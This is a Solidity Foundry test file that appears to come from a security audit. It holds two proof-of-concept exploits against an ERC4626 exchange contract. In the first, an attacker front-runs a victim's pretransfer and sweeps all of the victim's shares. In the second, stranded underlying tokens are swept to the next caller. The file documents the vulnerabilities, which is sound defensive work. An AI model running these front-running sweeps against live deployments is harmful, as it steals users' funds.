// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {TestBase_ERC4626StandardExchange} from
    "contracts/test/bases/TestBase_ERC4626StandardExchange.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {SimpleYieldERC4626} from "contracts/test/stubs/SimpleYieldERC4626.sol";

/**
 * @notice APEX-2026-009 — executed PoC.
 *
 *         `ERC4626StandardExchangeCommon._burnSeShares` (and its byte-identical twin in
 *         `MorphoBlueStandardExchangeCommon`) on the `pretransferred` path:
 *
 *             ERC20Repo._burn(address(this), burnAmount);
 *             uint256 leftover = IERC20(address(this)).balanceOf(address(this));
 *             if (leftover > 0) IERC20(address(this)).safeTransfer(owner, leftover);
 *
 *         `owner` is `msg.sender` at every call site. `leftover` is the WHOLE self-share
 *         balance after the burn, with no booked-reserve subtraction and no link to what
 *         this caller actually pretransferred.
 *
 *         Consequence: the two-step pretransfer flow is front-runnable. A victim moves
 *         shares onto the diamond; an attacker calls first with a minimal burn and takes
 *         the entire remainder, having supplied no capital.
 *
 *         Hermetic — production DFPkg deploy, no mocks of the SUT.
 */
contract ApexBurnSeSharesSweep is TestBase_ERC4626StandardExchange {
    SimpleMintableERC20 internal underlying;
    SimpleYieldERC4626 internal protocolVault;
    address internal se;
    IStandardExchangeIn internal seIn;

    address internal victim   = address(0xBEEF);
    address internal attacker = address(0xA77ACC);

    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        underlying = new SimpleMintableERC20("Underlying", "UND");
        protocolVault = new SimpleYieldERC4626(underlying);
        se = _deployERC4626SE(address(protocolVault));
        seIn = IStandardExchangeIn(se);

        underlying.mint(victim, 1_000_000 ether);
        vm.startPrank(victim);
        underlying.approve(se, type(uint256).max);
        underlying.approve(address(protocolVault), type(uint256).max);
        vm.stopPrank();
    }

    function _dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function test_apex009_attackerSweepsPretransferredShares() public {
        // ---- victim acquires SE shares through the real wrap route ----
        vm.prank(victim);uint256 shares = seIn.exchangeIn(IERC20(address(underlying)), 1_000 ether, IERC20(se), 0, victim, false, _dl()
        );
        assertGt(shares, 0, "victim must hold shares");
        emit log_named_uint("victim shares minted", shares);

        // ---- step 1 of the victim's intended two-step flow: push shares onto the SE ----
        vm.prank(victim);
        IERC20(se).transfer(se, shares);
        assertEq(IERC20(se).balanceOf(se), shares, "shares resting on diamond");
        assertEq(IERC20(se).balanceOf(victim), 0, "victim has pretransferred");

        // ---- attacker front-runs step 2. Attacker holds NOTHING. ----
        assertEq(IERC20(se).balanceOf(attacker), 0, "attacker starts with no shares");
        assertEq(underlying.balanceOf(attacker), 0, "attacker starts with no underlying");

        uint256 minimalBurn = shares / 1000;   // smallest burn that still yields non-zero output
        vm.prank(attacker);uint256 got = seIn.exchangeIn(IERC20(se), minimalBurn, IERC20(address(underlying)), 0, attacker, true, _dl()
        );

        uint256 sweptShares = IERC20(se).balanceOf(attacker);
        emit log_named_uint("attacker underlying received", got);
        emit log_named_uint("attacker SHARES swept as 'leftover'", sweptShares);
        emit log_named_uint("victim shares remaining", IERC20(se).balanceOf(victim));
        emit log_named_uint("diamond self-share remaining", IERC20(se).balanceOf(se));
        emit log_string("attacker capital committed: 0");

        assertGt(sweptShares, 0, "APEX-2026-009: refund paid to caller, not to the pretransferrer");
        assertEq(sweptShares, shares - minimalBurn, "attacker takes the entire remainder");
        assertEq(IERC20(se).balanceOf(victim), 0, "victim lost everything");
    }

    /// @notice Control: on the non-pretransferred path the same route is correctly debited.
    function test_apex009_control_nonPretransferredPathIsSafe() public {
        vm.prank(victim);uint256 shares = seIn.exchangeIn(IERC20(address(underlying)), 1_000 ether, IERC20(se), 0, victim, false, _dl()
        );
        vm.prank(victim);
        IERC20(se).transfer(se, shares);

        // attacker cannot burn from a balance it does not hold
        vm.prank(attacker);
        vm.expectRevert();seIn.exchangeIn(IERC20(se), shares / 1000, IERC20(address(underlying)), 0, attacker, false, _dl()
        );
        emit log_string("non-pretransferred path correctly burns from msg.sender and reverts");
    }
}

/**
 * @notice APEX-2026-004 part B — "idle underlying is swept to msg.sender".
 *
 *         `_refundOrAbsorbAbove(tokenIn, msg.sender, 0)` is called on the underlying at
 *         `ERC4626StandardExchangeInTarget.sol:92,107` and `OutTarget.sol:88`. Its own
 *         docstring warns never to call it with `keepBalance == 0` on tokens that back SE
 *         shares. It IS called with 0 — but on the underlying, which the docstring says is
 *         the intended usage.
 *
 *         Question: can a third party's idle underlying resting on the diamond be taken by
 *         the next caller? Measured, not assumed.
 */
contract ApexIdleUnderlyingSweep is TestBase_ERC4626StandardExchange {
    SimpleMintableERC20 internal underlying;
    SimpleYieldERC4626 internal protocolVault;
    address internal se;
    IStandardExchangeIn internal seIn;

    address internal donor    = address(0xD0FF);
    address internal attacker = address(0xA77ACC);

    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        underlying = new SimpleMintableERC20("Underlying", "UND");
        protocolVault = new SimpleYieldERC4626(underlying);
        se = _deployERC4626SE(address(protocolVault));
        seIn = IStandardExchangeIn(se);

        underlying.mint(attacker, 1_000 ether);
        vm.startPrank(attacker);
        underlying.approve(se, type(uint256).max);
        underlying.approve(address(protocolVault), type(uint256).max);
        vm.stopPrank();
    }

    function _dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function test_apex004B_idleUnderlyingFollowsTheCaller() public {
        // A third party's underlying comes to rest on the diamond.
        uint256 stranded = 250 ether;
        underlying.mint(se, stranded);
        emit log_named_uint("stranded underlying on SE", underlying.balanceOf(se));

        uint256 attStart = underlying.balanceOf(attacker);
        uint256 contributed = 10 ether;

        vm.prank(attacker);seIn.exchangeIn(IERC20(address(underlying)), contributed, IERC20(se), 0, attacker, false, _dl()
        );

        uint256 attEnd = underlying.balanceOf(attacker);
        emit log_named_uint("attacker underlying start", attStart);
        emit log_named_uint("attacker underlying end  ", attEnd);
        emit log_named_uint("attacker contributed     ", contributed);
        emit log_named_uint("SE underlying remaining  ", underlying.balanceOf(se));

        if (attEnd + contributed > attStart) {
            emit log_named_uint("NET PROFIT", attEnd + contributed - attStart);
            emit log_string("CONFIRMED: stranded underlying followed the caller out");
        } else {
            emit log_string("NOT REACHABLE: stranded underlying stayed / went to reserve");
        }
        assertGt(attEnd + contributed, attStart, "APEX-2026-004B: idle underlying swept to caller");
    }
}
